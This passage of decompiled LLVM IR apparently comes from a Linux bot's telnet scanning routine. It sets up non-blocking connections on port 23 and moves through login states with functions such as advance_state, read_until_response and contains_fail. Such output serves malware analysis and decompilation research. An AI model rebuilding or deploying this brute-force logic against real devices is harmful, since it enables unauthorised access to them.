dec_label_pc_804a5f8:                             ; preds = %dec_label_pc_804a52c
  %v5_804a60e = load i8, i8* %v4_804a542, align 1
  %v6_804a60e = zext i8 %v5_804a60e to i32
  store i32 %v6_804a60e, i32* %eax.global-to-local, align 4
  %v4_804a613 = icmp eq i8 %v5_804a60e, 0
  %v1_804a615 = icmp eq i1 %v4_804a613, false
  br i1 %v1_804a615, label %dec_label_pc_804a6e8, label %dec_label_pc_804a61b

dec_label_pc_804a61b:                             ; preds = %dec_label_pc_804a5f8
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a633 = add i32 %v2_804a633, %v2_804a4b2
  %v4_804a633 = inttoptr i32 %v3_804a633 to i8*
  %v5_804a633 = load i8, i8* %v4_804a633, align 1
  %v2_804a63a = add i8 %v5_804a633, 1
  store i8 %v2_804a63a, i8* %v4_804a633, align 1
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a67a = add i32 %v2_804a67a, %v2_804a4b2
  %v4_804a67a = inttoptr i32 %v3_804a67a to i8*
  %v5_804a67a = load i8, i8* %v4_804a67a, align 2
  %v2_804a681 = add i8 %v5_804a67a, 1
  store i8 %v2_804a681, i8* %v4_804a67a, align 2
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v5_804a6bf = load i8, i8* %v4_804a67a, align 2
  %v6_804a6bf = zext i8 %v5_804a6bf to i32
  store i32 %v6_804a6bf, i32* %eax.global-to-local, align 4
  %v10_804a6c4 = icmp eq i8 %v5_804a6bf, 9
  %v1_804a6c6 = icmp eq i1 %v10_804a6c4, false
  br i1 %v1_804a6c6, label %dec_label_pc_804a6e8, label %dec_label_pc_804a6c8

dec_label_pc_804a6c8:                             ; preds = %dec_label_pc_804a61b
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a542, align 1
  br label %dec_label_pc_804b42f

dec_label_pc_804a6e8:                             ; preds = %dec_label_pc_804a61b, %dec_label_pc_804a5f8, %dec_label_pc_804a54f
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804a6f1 = load i32, i32* @esp, align 4
  %v1_804a6f1 = inttoptr i32 %v0_804a6f1 to i32*
  store i32 23, i32* %v1_804a6f1, align 4
  %v0_804a6f8 = load i32, i32* %stack_var_-604, align 4
  %v1_804a6f8 = trunc i32 %v0_804a6f8 to i16
  %v2_804a6f8 = call i32 @htons(i16 %v1_804a6f8)
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  %v1_804a735 = add i32 %v2_804a4b4, 4
  store i32 %v1_804a735, i32* %eax.global-to-local, align 4
  %v1_804a738 = inttoptr i32 %v1_804a735 to i32*
  %v2_804a738 = load i32, i32* %v1_804a738, align 4
  store i32 %v2_804a738, i32* %eax.global-to-local, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804a743 = load i32, i32* @esp, align 4
  %v1_804a743 = add i32 %v0_804a743, 8
  %v2_804a743 = inttoptr i32 %v1_804a743 to i32*
  store i32 0, i32* %v2_804a743, align 4
  %v0_804a74b = load i32, i32* @esp, align 4
  %v1_804a74b = add i32 %v0_804a74b, 4
  %v2_804a74b = inttoptr i32 %v1_804a74b to i32*
  store i32 1, i32* %v2_804a74b, align 4
  %v0_804a753 = load i32, i32* @esp, align 4
  %v1_804a753 = inttoptr i32 %v0_804a753 to i32*
  store i32 2, i32* %v1_804a753, align 4
  %v2_804a75a = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v2_804a6f8, 65536
  %v3_804a75a = sdiv i32 %sext, 65536
  %v4_804a75a = call i32 @socket(i32 %v3_804a75a, i32 %v2_804a738, i32 %v2_804a75a)
  store i32 %v4_804a75a, i32* @esi, align 4
  %v0_804a764 = load i32, i32* @ebx, align 4
  %v2_804a774 = mul i32 %v0_804a764, 28
  %v3_804a776 = add i32 %v2_804a774, %v2_804a3bd
  %v4_804a776 = inttoptr i32 %v3_804a776 to i32*
  store i32 %v4_804a75a, i32* %v4_804a776, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a78f = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804a78f = load i32, i32* %v3_804a78f, align 4
  store i32 %v4_804a78f, i32* %eax.global-to-local, align 4
  %v10_804a792 = icmp eq i32 %v4_804a78f, -1
  br i1 %v10_804a792, label %dec_label_pc_804b42f, label %dec_label_pc_804a79b

dec_label_pc_804a79b:                             ; preds = %dec_label_pc_804a6e8
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a7b1 = load i32, i32* %v3_804a78f, align 4
  store i32 %v4_804a7b1, i32* %eax.global-to-local, align 4
  %v0_804a7b4 = load i32, i32* @esp, align 4
  %v1_804a7b4 = add i32 %v0_804a7b4, 8
  %v2_804a7b4 = inttoptr i32 %v1_804a7b4 to i32*
  store i32 0, i32* %v2_804a7b4, align 4
  %v0_804a7bc = load i32, i32* @esp, align 4
  %v1_804a7bc = add i32 %v0_804a7bc, 4
  %v2_804a7bc = inttoptr i32 %v1_804a7bc to i32*
  store i32 3, i32* %v2_804a7bc, align 4
  %v0_804a7c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a7c4 = load i32, i32* @esp, align 4
  %v2_804a7c4 = inttoptr i32 %v1_804a7c4 to i32*
  store i32 %v0_804a7c4, i32* %v2_804a7c4, align 4
  %v1_804a7c7 = load i32, i32* %stack_var_-596, align 4
  %v3_804a7c7 = call i32 @__libc_fcntl(i32 %v2_804a738, i32 %v1_804a7c7, i32 0)
  %v1_804a7ce = or i32 %v3_804a7c7, 2048
  store i32 %v1_804a7ce, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a7ea = load i32, i32* %v3_804a78f, align 4
  store i32 %v4_804a7ea, i32* %eax.global-to-local, align 4
  %v1_804a7ed = load i32, i32* @esp, align 4
  %v2_804a7ed = add i32 %v1_804a7ed, 8
  %v3_804a7ed = inttoptr i32 %v2_804a7ed to i32*
  store i32 %v1_804a7ce, i32* %v3_804a7ed, align 4
  %v0_804a7f1 = load i32, i32* @esp, align 4
  %v1_804a7f1 = add i32 %v0_804a7f1, 4
  %v2_804a7f1 = inttoptr i32 %v1_804a7f1 to i32*
  store i32 4, i32* %v2_804a7f1, align 4
  %v0_804a7f9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a7f9 = load i32, i32* @esp, align 4
  %v2_804a7f9 = inttoptr i32 %v1_804a7f9 to i32*
  store i32 %v0_804a7f9, i32* %v2_804a7f9, align 4
  %v1_804a7fc = load i32, i32* %stack_var_-596, align 4
  %v3_804a7fc = call i32 @__libc_fcntl(i32 %v2_804a738, i32 %v1_804a7fc, i32 0)
  store i32 %v2_804a346, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a81d = load i32, i32* %v3_804a78f, align 4
  store i32 %v4_804a81d, i32* %eax.global-to-local, align 4
  %v0_804a820 = load i32, i32* @esp, align 4
  %v1_804a820 = add i32 %v0_804a820, 8
  %v2_804a820 = inttoptr i32 %v1_804a820 to i32*
  store i32 16, i32* %v2_804a820, align 4
  %v1_804a828 = load i32, i32* @esp, align 4
  %v2_804a828 = add i32 %v1_804a828, 4
  %v3_804a828 = inttoptr i32 %v2_804a828 to i32*
  store i32 %v2_804a346, i32* %v3_804a828, align 4
  %v0_804a82c = load i32, i32* %eax.global-to-local, align 4
  %v1_804a82c = load i32, i32* @esp, align 4
  %v2_804a82c = inttoptr i32 %v1_804a82c to i32*
  store i32 %v0_804a82c, i32* %v2_804a82c, align 4
  %v1_804a82f = load i32, i32* %stack_var_-596, align 4
  %v3_804a82f = call i32 @__libc_connect(i32 %v2_804a738, i32 %v1_804a82f, i32 0)
  store i32 %v3_804a82f, i32* %eax.global-to-local, align 4
  %v10_804a834 = icmp eq i32 %v3_804a82f, -1
  %v1_804a837 = icmp eq i1 %v10_804a834, false
  br i1 %v1_804a837, label %dec_label_pc_804a86b, label %dec_label_pc_804a839

dec_label_pc_804a839:                             ; preds = %dec_label_pc_804a79b
  %v1_804a839 = call i32 @__errno_location(i32 %v2_804a738)
  store i32 %v1_804a839, i32* %eax.global-to-local, align 4
  %v1_804a83e = inttoptr i32 %v1_804a839 to i32*
  %v2_804a83e = load i32, i32* %v1_804a83e, align 4
  store i32 %v2_804a83e, i32* %eax.global-to-local, align 4
  %v9_804a840 = icmp eq i32 %v2_804a83e, 115
  br i1 %v9_804a840, label %dec_label_pc_804a86b, label %dec_label_pc_804a845

dec_label_pc_804a845:                             ; preds = %dec_label_pc_804a839
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804a85e = load i32, i32* @esp, align 4
  %v2_804a85e = inttoptr i32 %v1_804a85e to i32*
  store i32 %v2_804a4b4, i32* %v2_804a85e, align 4
  %v1_804a861 = call i32 @reset_telstate(i32 %v2_804a738)
  store i32 %v1_804a861, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804a86b:                             ; preds = %dec_label_pc_804a839, %dec_label_pc_804a79b
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804a884 = load i32, i32* @esp, align 4
  %v1_804a884 = add i32 %v0_804a884, 4
  %v2_804a884 = inttoptr i32 %v1_804a884 to i32*
  store i32 1, i32* %v2_804a884, align 4
  %v0_804a88c = load i32, i32* %eax.global-to-local, align 4
  %v1_804a88c = load i32, i32* @esp, align 4
  %v2_804a88c = inttoptr i32 %v1_804a88c to i32*
  store i32 %v0_804a88c, i32* %v2_804a88c, align 4
  %v1_804a88f = load i32, i32* %stack_var_-596, align 4
  %v2_804a88f = inttoptr i32 %v2_804a738 to i32*
  %v3_804a88f = call i32 @advance_state(i32* %v2_804a88f, i32 %v1_804a88f)
  store i32 %v3_804a88f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804a899:                             ; preds = %dec_label_pc_804a4ec
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a8a3, i32* @edi, align 4
  %v5_804a8aa = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a8c8 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804a8c8 = load i32, i32* %v3_804a8c8, align 4
  %v2_804a8cd = udiv i32 %v4_804a8c8, 32
  store i32 %v2_804a8cd, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a8e6 = load i32, i32* %v3_804a8c8, align 4
  %v1_804a8e9 = urem i32 %v4_804a8e6, 32
  store i32 %v1_804a8e9, i32* %eax.global-to-local, align 4
  %v0_804a8ec = load i32, i32* @ebp, align 4
  %v2_804a8ec = mul nuw nsw i32 %v2_804a8cd, 4
  %v3_804a8ec = add nsw i32 %v2_804a8ec, -312
  %v4_804a8ec = add i32 %v3_804a8ec, %v0_804a8ec
  %v5_804a8ec = inttoptr i32 %v4_804a8ec to i32*
  %v6_804a8ec = load i32, i32* %v5_804a8ec, align 4
  %v9_804a8ec = shl i32 1, %v1_804a8e9
  %v12_804a8ec = or i32 %v6_804a8ec, %v9_804a8ec
  store i32 %v12_804a8ec, i32* %v5_804a8ec, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a91d = load i32, i32* %v3_804a8c8, align 4
  %v1_804a920 = add i32 %v4_804a91d, 1
  store i32 %v1_804a920, i32* %edx.global-to-local, align 4
  %v1_804a929 = load i32, i32* @esp, align 4
  %v2_804a929 = add i32 %v1_804a929, 16
  %v3_804a929 = inttoptr i32 %v2_804a929 to i32*
  store i32 %v2_804a923, i32* %v3_804a929, align 4
  %v0_804a92d = load i32, i32* @esp, align 4
  %v1_804a92d = add i32 %v0_804a92d, 12
  %v2_804a92d = inttoptr i32 %v1_804a92d to i32*
  store i32 0, i32* %v2_804a92d, align 4
  store i32 %v2_804a8a3, i32* %eax.global-to-local, align 4
  %v1_804a93b = load i32, i32* @esp, align 4
  %v2_804a93b = add i32 %v1_804a93b, 8
  %v3_804a93b = inttoptr i32 %v2_804a93b to i32*
  store i32 %v2_804a8a3, i32* %v3_804a93b, align 4
  %v0_804a93f = load i32, i32* @esp, align 4
  %v1_804a93f = add i32 %v0_804a93f, 4
  %v2_804a93f = inttoptr i32 %v1_804a93f to i32*
  store i32 0, i32* %v2_804a93f, align 4
  %v0_804a947 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a947 = load i32, i32* @esp, align 4
  %v2_804a947 = inttoptr i32 %v1_804a947 to i32*
  store i32 %v0_804a947, i32* %v2_804a947, align 4
  %v0_804a94a = load i32, i32* %stack_var_-324, align 4
  %v2_804a94a = load i32, i32* %stack_var_-316, align 4
  %v5_804a94a = call i32 @__libc_select(i32 %v0_804a94a, i32 %arg1, i32 %v2_804a94a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804a94a, i32* %eax.global-to-local, align 4
  %v12_804a952 = icmp eq i32 %v5_804a94a, 1
  %v1_804a956 = icmp eq i1 %v12_804a952, false
  br i1 %v1_804a956, label %dec_label_pc_804aa79, label %dec_label_pc_804a95c

dec_label_pc_804a95c:                             ; preds = %dec_label_pc_804a899
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a986 = load i32, i32* %v3_804a8c8, align 4
  store i32 %v4_804a986, i32* %edx.global-to-local, align 4
  %v1_804a98f = load i32, i32* @esp, align 4
  %v2_804a98f = add i32 %v1_804a98f, 16
  %v3_804a98f = inttoptr i32 %v2_804a98f to i32*
  store i32 %v2_804a989, i32* %v3_804a98f, align 4
  store i32 %v2_804a993, i32* %eax.global-to-local, align 4
  %v1_804a999 = load i32, i32* @esp, align 4
  %v2_804a999 = add i32 %v1_804a999, 12
  %v3_804a999 = inttoptr i32 %v2_804a999 to i32*
  store i32 %v2_804a993, i32* %v3_804a999, align 4
  %v0_804a99d = load i32, i32* @esp, align 4
  %v1_804a99d = add i32 %v0_804a99d, 8
  %v2_804a99d = inttoptr i32 %v1_804a99d to i32*
  store i32 4, i32* %v2_804a99d, align 4
  %v0_804a9a5 = load i32, i32* @esp, align 4
  %v1_804a9a5 = add i32 %v0_804a9a5, 4
  %v2_804a9a5 = inttoptr i32 %v1_804a9a5 to i32*
  store i32 1, i32* %v2_804a9a5, align 4
  %v0_804a9ad = load i32, i32* %edx.global-to-local, align 4
  %v1_804a9ad = load i32, i32* @esp, align 4
  %v2_804a9ad = inttoptr i32 %v1_804a9ad to i32*
  store i32 %v0_804a9ad, i32* %v2_804a9ad, align 4
  %v0_804a9b0 = load i32, i32* %stack_var_-332, align 4
  %v1_804a9b0 = load i32, i32* %stack_var_-328, align 4
  %v2_804a9b0 = load i32, i32* %stack_var_-324, align 4
  %v4_804a9b0 = load i32, i32* %stack_var_-316, align 4
  %v5_804a9b0 = call i32 @getsockopt(i32 %v0_804a9b0, i32 %v1_804a9b0, i32 %v2_804a9b0, i32 %arg1, i32 %v4_804a9b0)
  %v3_804a9b5 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804a9b5, i32* %eax.global-to-local, align 4
  %v1_804a9bb = icmp eq i32 %v3_804a9b5, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804a9bb, label %dec_label_pc_804a9e5, label %dec_label_pc_804a9bf

dec_label_pc_804a9bf:                             ; preds = %dec_label_pc_804a95c
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804a9d8 = load i32, i32* @esp, align 4
  %v2_804a9d8 = inttoptr i32 %v1_804a9d8 to i32*
  store i32 %v2_804a4b4, i32* %v2_804a9d8, align 4
  %v0_804a9db = load i32, i32* %stack_var_-332, align 4
  %v1_804a9db = call i32 @reset_telstate(i32 %v0_804a9db)
  store i32 %v1_804a9db, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804a9e5:                             ; preds = %dec_label_pc_804a95c
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804a9fb = load i32, i32* %v3_804a8c8, align 4
  store i32 %v4_804a9fb, i32* %eax.global-to-local, align 4
  %v0_804a9fe = load i32, i32* @esp, align 4
  %v1_804a9fe = add i32 %v0_804a9fe, 8
  %v2_804a9fe = inttoptr i32 %v1_804a9fe to i32*
  store i32 0, i32* %v2_804a9fe, align 4
  %v0_804aa06 = load i32, i32* @esp, align 4
  %v1_804aa06 = add i32 %v0_804aa06, 4
  %v2_804aa06 = inttoptr i32 %v1_804aa06 to i32*
  store i32 3, i32* %v2_804aa06, align 4
  %v0_804aa0e = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa0e = load i32, i32* @esp, align 4
  %v2_804aa0e = inttoptr i32 %v1_804aa0e to i32*
  store i32 %v0_804aa0e, i32* %v2_804aa0e, align 4
  %v0_804aa11 = load i32, i32* %stack_var_-332, align 4
  %v1_804aa11 = load i32, i32* %stack_var_-328, align 4
  %v2_804aa11 = load i32, i32* %stack_var_-324, align 4
  %v3_804aa11 = call i32 @__libc_fcntl(i32 %v0_804aa11, i32 %v1_804aa11, i32 %v2_804aa11)
  %v1_804aa18 = and i32 %v3_804aa11, -2049
  store i32 %v1_804aa18, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804aa34 = load i32, i32* %v3_804a8c8, align 4
  store i32 %v4_804aa34, i32* %eax.global-to-local, align 4
  %v1_804aa37 = load i32, i32* @esp, align 4
  %v2_804aa37 = add i32 %v1_804aa37, 8
  %v3_804aa37 = inttoptr i32 %v2_804aa37 to i32*
  store i32 %v1_804aa18, i32* %v3_804aa37, align 4
  %v0_804aa3b = load i32, i32* @esp, align 4
  %v1_804aa3b = add i32 %v0_804aa3b, 4
  %v2_804aa3b = inttoptr i32 %v1_804aa3b to i32*
  store i32 4, i32* %v2_804aa3b, align 4
  %v0_804aa43 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa43 = load i32, i32* @esp, align 4
  %v2_804aa43 = inttoptr i32 %v1_804aa43 to i32*
  store i32 %v0_804aa43, i32* %v2_804aa43, align 4
  %v0_804aa46 = load i32, i32* %stack_var_-332, align 4
  %v1_804aa46 = load i32, i32* %stack_var_-328, align 4
  %v2_804aa46 = load i32, i32* %stack_var_-324, align 4
  %v3_804aa46 = call i32 @__libc_fcntl(i32 %v0_804aa46, i32 %v1_804aa46, i32 %v2_804aa46)
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804aa64 = load i32, i32* @esp, align 4
  %v1_804aa64 = add i32 %v0_804aa64, 4
  %v2_804aa64 = inttoptr i32 %v1_804aa64 to i32*
  store i32 2, i32* %v2_804aa64, align 4
  %v0_804aa6c = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa6c = load i32, i32* @esp, align 4
  %v2_804aa6c = inttoptr i32 %v1_804aa6c to i32*
  store i32 %v0_804aa6c, i32* %v2_804aa6c, align 4
  %v0_804aa6f = load i32, i32* %stack_var_-332, align 4
  %v1_804aa6f = load i32, i32* %stack_var_-328, align 4
  %v2_804aa6f = inttoptr i32 %v0_804aa6f to i32*
  %v3_804aa6f = call i32 @advance_state(i32* %v2_804aa6f, i32 %v1_804aa6f)
  store i32 %v3_804aa6f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804aa79:                             ; preds = %dec_label_pc_804a899
  %v13_804aa79 = icmp eq i32 %v5_804a94a, -1
  %v1_804aa7d = icmp eq i1 %v13_804aa79, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804aa7d, label %dec_label_pc_804aaa5, label %dec_label_pc_804aa7f

dec_label_pc_804aa7f:                             ; preds = %dec_label_pc_804aa79
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804aa98 = load i32, i32* @esp, align 4
  %v2_804aa98 = inttoptr i32 %v1_804aa98 to i32*
  store i32 %v2_804a4b4, i32* %v2_804aa98, align 4
  %v1_804aa9b = call i32 @reset_telstate(i32 %v5_804a94a)
  store i32 %v1_804aa9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804aaa5:                             ; preds = %dec_label_pc_804aa79
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v2_804aac0 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804aac0, i32* %eax.global-to-local, align 4
  %v1_804aac2 = add i32 %v2_804aac0, 5
  store i32 %v1_804aac2, i32* @ebx, align 4
  %v0_804aac5 = load i32, i32* @esp, align 4
  %v1_804aac5 = inttoptr i32 %v0_804aac5 to i32*
  store i32 0, i32* %v1_804aac5, align 4
  %v1_804aacc = inttoptr i32 %v5_804a94a to i32*
  %v2_804aacc = call i32 @__GI_time(i32* %v1_804aacc)
  store i32 %v2_804aacc, i32* %eax.global-to-local, align 4
  %v0_804aad1 = load i32, i32* @ebx, align 4
  %v7_804aad1 = icmp ult i32 %v0_804aad1, %v2_804aacc
  %v1_804aad3 = icmp eq i1 %v7_804aad1, false
  br i1 %v1_804aad3, label %dec_label_pc_804b42f, label %dec_label_pc_804aad9

dec_label_pc_804aad9:                             ; preds = %dec_label_pc_804aaa5
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804aaf2 = load i32, i32* @esp, align 4
  %v2_804aaf2 = inttoptr i32 %v1_804aaf2 to i32*
  store i32 %v2_804a4b4, i32* %v2_804aaf2, align 4
  %v0_804aaf5 = load i32, i32* %stack_var_-332, align 4
  %v1_804aaf5 = call i32 @reset_telstate(i32 %v0_804aaf5)
  store i32 %v1_804aaf5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804aaff:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  %v1_804ab17 = add i32 %v2_804a4b4, 24
  store i32 %v1_804ab17, i32* %eax.global-to-local, align 4
  %v1_804ab1a = inttoptr i32 %v1_804ab17 to i32*
  %v2_804ab1a = load i32, i32* %v1_804ab1a, align 4
  store i32 %v2_804ab1a, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804ab32 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804ab32 = load i32, i32* %v3_804ab32, align 4
  store i32 %v4_804ab32, i32* %edx.global-to-local, align 4
  %v0_804ab35 = load i32, i32* @esp, align 4
  %v1_804ab35 = add i32 %v0_804ab35, 16
  %v2_804ab35 = inttoptr i32 %v1_804ab35 to i32*
  store i32 134585676, i32* %v2_804ab35, align 4
  %v0_804ab3d = load i32, i32* @esp, align 4
  %v1_804ab3d = add i32 %v0_804ab3d, 12
  %v2_804ab3d = inttoptr i32 %v1_804ab3d to i32*
  store i32 1024, i32* %v2_804ab3d, align 4
  %v0_804ab45 = load i32, i32* @ebx, align 4
  %v1_804ab45 = load i32, i32* @esp, align 4
  %v2_804ab45 = add i32 %v1_804ab45, 8
  %v3_804ab45 = inttoptr i32 %v2_804ab45 to i32*
  store i32 %v0_804ab45, i32* %v3_804ab45, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804ab4c = load i32, i32* @esp, align 4
  %v2_804ab4c = add i32 %v1_804ab4c, 4
  %v3_804ab4c = inttoptr i32 %v2_804ab4c to i32*
  store i32 %arg1, i32* %v3_804ab4c, align 4
  %v0_804ab50 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ab50 = load i32, i32* @esp, align 4
  %v2_804ab50 = inttoptr i32 %v1_804ab50 to i32*
  store i32 %v0_804ab50, i32* %v2_804ab50, align 4
  %v1_804ab53 = call i32 @read_until_response(i32 %v6_804a502)
  %v1_804ab58 = icmp eq i32 %v1_804ab53, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  br i1 %v1_804ab58, label %dec_label_pc_804abe5, label %dec_label_pc_804ab60

dec_label_pc_804ab60:                             ; preds = %dec_label_pc_804aaff
  store i32 %v1_804ab17, i32* %eax.global-to-local, align 4
  %v2_804ab7b = load i32, i32* %v1_804ab1a, align 4
  store i32 %v2_804ab7b, i32* %eax.global-to-local, align 4
  %v1_804ab7d = load i32, i32* @esp, align 4
  %v2_804ab7d = inttoptr i32 %v1_804ab7d to i32*
  store i32 %v2_804ab7b, i32* %v2_804ab7d, align 4
  %v0_804ab80 = load i32, i32* %stack_var_-332, align 4
  %v1_804ab80 = call i32 @contains_fail(i32 %v0_804ab80)
  %v1_804ab85 = icmp eq i32 %v1_804ab80, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804abd0 = load i32, i32* @esp, align 4
  %v1_804abd0 = add i32 %v0_804abd0, 4
  %v2_804abd0 = inttoptr i32 %v1_804abd0 to i32*
  br i1 %v1_804ab85, label %dec_label_pc_804abb7, label %dec_label_pc_804ab89

dec_label_pc_804ab89:                             ; preds = %dec_label_pc_804ab60
  store i32 0, i32* %v2_804abd0, align 4
  %v0_804abaa = load i32, i32* %eax.global-to-local, align 4
  %v1_804abaa = load i32, i32* @esp, align 4
  %v2_804abaa = inttoptr i32 %v1_804abaa to i32*
  store i32 %v0_804abaa, i32* %v2_804abaa, align 4
  %v0_804abad = load i32, i32* %stack_var_-332, align 4
  %v1_804abad = load i32, i32* %stack_var_-328, align 4
  %v2_804abad = inttoptr i32 %v0_804abad to i32*
  %v3_804abad = call i32 @advance_state(i32* %v2_804abad, i32 %v1_804abad)
  store i32 %v3_804abad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804abb7:                             ; preds = %dec_label_pc_804ab60
  store i32 3, i32* %v2_804abd0, align 4
  %v0_804abd8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804abd8 = load i32, i32* @esp, align 4
  %v2_804abd8 = inttoptr i32 %v1_804abd8 to i32*
  store i32 %v0_804abd8, i32* %v2_804abd8, align 4
  %v0_804abdb = load i32, i32* %stack_var_-332, align 4
  %v1_804abdb = load i32, i32* %stack_var_-328, align 4
  %v2_804abdb = inttoptr i32 %v0_804abdb to i32*
  %v3_804abdb = call i32 @advance_state(i32* %v2_804abdb, i32 %v1_804abdb)
  store i32 %v3_804abdb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804abe5:                             ; preds = %dec_label_pc_804aaff
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v2_804ac00 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804ac00, i32* %eax.global-to-local, align 4
  %v1_804ac02 = add i32 %v2_804ac00, 7
  store i32 %v1_804ac02, i32* @ebx, align 4
  %v0_804ac05 = load i32, i32* @esp, align 4
  %v1_804ac05 = inttoptr i32 %v0_804ac05 to i32*
  store i32 0, i32* %v1_804ac05, align 4
  %v0_804ac0c = load i32, i32* %stack_var_-332, align 4
  %v1_804ac0c = inttoptr i32 %v0_804ac0c to i32*
  %v2_804ac0c = call i32 @__GI_time(i32* %v1_804ac0c)
  store i32 %v2_804ac0c, i32* %eax.global-to-local, align 4
  %v0_804ac11 = load i32, i32* @ebx, align 4
  %v7_804ac11 = icmp ult i32 %v0_804ac11, %v2_804ac0c
  %v1_804ac13 = icmp eq i1 %v7_804ac11, false
  br i1 %v1_804ac13, label %dec_label_pc_804b42f, label %dec_label_pc_804ac19

dec_label_pc_804ac19:                             ; preds = %dec_label_pc_804abe5
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804ac32 = load i32, i32* @esp, align 4
  %v2_804ac32 = inttoptr i32 %v1_804ac32 to i32*
  store i32 %v2_804a4b4, i32* %v2_804ac32, align 4
  %v0_804ac35 = load i32, i32* %stack_var_-332, align 4
  %v1_804ac35 = call i32 @reset_telstate(i32 %v0_804ac35)
  store i32 %v1_804ac35, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804ac3f:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804ac55 = add i32 %v2_804a67a, %v2_804a4b2
  %v4_804ac55 = inttoptr i32 %v3_804ac55 to i8*
